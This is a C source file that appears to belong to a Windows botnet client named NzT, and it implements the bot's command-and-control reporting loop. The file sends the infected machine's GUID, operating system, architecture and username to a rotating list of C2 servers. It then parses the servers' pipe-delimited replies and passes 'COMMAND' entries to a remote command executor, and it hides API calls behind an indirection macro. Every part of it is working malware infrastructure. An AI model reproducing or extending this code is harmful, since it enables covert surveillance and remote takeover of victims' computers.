#include <Windows.h>
#ifdef _DEBUG
#include <stdio.h>
#endif

#include "report.h"
#include "config.h"
#include "http.h"
#include "nzt.h"
#include "crt.h"
#include "utils.h"
#include "globals.h"
#include "command.h"
#include "strings.h"

long _atoi(const char* S)
{
	long num = 0;
	int i	 = 0;

	// run till the end of the string is reached, or the
	// current character is non-numeric
	while (S[i] && (S[i] >= '0' && S[i] <= '9'))
	{
		num = num * 10 + (S[i] - '0');
		i++;
	}

	return num;
}

VOID ProcessServerResponse(CONST PCHAR Response)
{
	PCHAR  Data[512] = { 0 };
	PCHAR  Token = NULL;
	INT    Parameters = 0;

	MemoryZero(&Data, sizeof(Data));

	Token = StringTokenizeA(Response, "|");
	do
	{
		if (Parameters >= sizeof(Data) / sizeof(CHAR))
			break;
		Data[Parameters++] = Token;
	} while (Token = StringTokenizeA(NULL, "|"));


	if (!StringCompareA(Data[0], "COMMAND"))
		CommandExecute(_atoi(Data[1]), Data);
	else if (!StringCompareA(Data[0], "ERROR"))
		DebugPrint("NzT: Report Error! Data: %s\n", Data);
}

DWORD ReportThread()
{
	PCHAR			Response	 = NULL;
	static CHAR     Data[512]    = { 0 };
	INT				CurrentHost  = 0;

	while (TRUE)
	{
		MemoryZero(&Data, sizeof(Data));

		if (NzT.Type == NEW_INFECTION)
			API(wsprintfA)(Data, STRING_REPORT_DATA, NEW_INFECTION, g_BotGuid, g_BotOS, g_BotArch, g_BotUsername);
		else
			API(wsprintfA)(Data, STRING_REPORT_DATA, RUNNING_INFECTION, g_BotGuid, g_BotOS, g_BotArch, g_BotUsername);

		do
		{
			if (!HttpPostRequest(g_Hosts[CurrentHost], STRING_REPORT_GATE_URL, Data, &Response))
			{
				DebugPrint("NzT: Failed to report to %s%s", g_Hosts[CurrentHost], STRING_REPORT_GATE_URL);
				CurrentHost++;
				break;
			}

			DebugPrint("NzT: Reported to %s%s", g_Hosts[CurrentHost], STRING_REPORT_GATE_URL);

			if (Response == NULL)
				break;

			DebugPrint("NzT: Server Response %s", Response);
			ProcessServerResponse(Response);
		} while (FALSE);

		if (Response != NULL)
		{
			Free(Response);
			Response = NULL;
		}

		if (CurrentHost == g_NumberHosts)
			CurrentHost = 0;

		_Sleep(REPORT_TIME * 60000);
	}

	return 0;
}

BOOL StartReportThread(void)
{
	if ((API(CreateThread)(0, 0, (LPTHREAD_START_ROUTINE)ReportThread, 0, 0, 0)) != 0)
		return TRUE;

	return FALSE;
}